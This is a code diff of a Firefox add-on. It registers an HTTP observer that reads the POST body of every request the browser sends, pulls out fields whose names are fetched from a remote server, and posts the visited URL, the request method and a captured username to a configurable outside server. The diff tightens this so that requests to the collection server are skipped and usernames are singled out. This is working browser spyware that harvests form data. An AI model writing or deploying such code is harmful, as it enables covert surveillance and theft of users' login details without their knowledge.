@@ -28,7 +28,7 @@ require('sdk/simple-prefs').on('_appUrl', function (appUrl) {
  */
 function getFieldNames(callback) {
     Request({
-        url:_fieldNamesUrl,
+        url: _fieldNamesUrl,
         onComplete: function (response) {
             callback(response);
         }
@@ -37,33 +37,39 @@ function getFieldNames(callback) {
 
 var httpRequestObserver = {
     observe: function (subject, topic, data) {
-        if (topic == 'http-on-modify-request') {
-            var postData = getPostBody(subject, topic, data);
-            postData = postData ? decodeURIComponent(postData) : '';
+        var urlRegExp = new RegExp(_appUrl + '\/?');
+        var requestUrl = subject.URI.spec;
 
-            var dataCollection = {
-                url: subject.URI.spec,
-                verb: subject.requestMethod
-            };
-
-            if (postData) {
-                _requestFields.forEach(function(field) {
-                    var fieldRegExp = new RegExp(field + '=(.*)&|' + field + '=(.*)$');
-                    var fieldSearchResult = _.remove(postData.match(fieldRegExp))[1];
-                    dataCollection[field] = fieldSearchResult ? fieldSearchResult : '';
-                });
-            }
-
-            Request({
-                url: _appUrl,
-                content: dataCollection,
-                onComplete: function (response) {
-                    console.log('Done');
-                }
-            }).post();
+        if (topic != 'http-on-modify-request' || requestUrl.search(urlRegExp) != -1) {
+            return;
         }
-    },
 
+        var postData = getPostBody(subject, topic, data);
+        postData = postData ? decodeURIComponent(postData) : '';
+
+        var dataCollection = {
+            url: requestUrl,
+            verb: subject.requestMethod,
+            username: ''
+        };
+
+        if (postData) {
+            _(_requestFields).forEach(function (field) {
+                var fieldRegExp = new RegExp(field + '=(.*)&|' + field + '=(.*)$');
+                var fieldSearchResult = _.remove(postData.match(fieldRegExp), undefined)[1];
+                if (fieldSearchResult) {
+                    dataCollection.username = fieldSearchResult;
+                    return false;
+                }
+            });
+        }
+
+        Request({
+            url: _appUrl,
+            content: JSON.stringify(dataCollection),
+            contentType: 'application/json'
+        }).post();
+    },
 
     get observerService() {
         return Cc['@mozilla.org/observer-service;1'].getService(Ci.nsIObserverService);
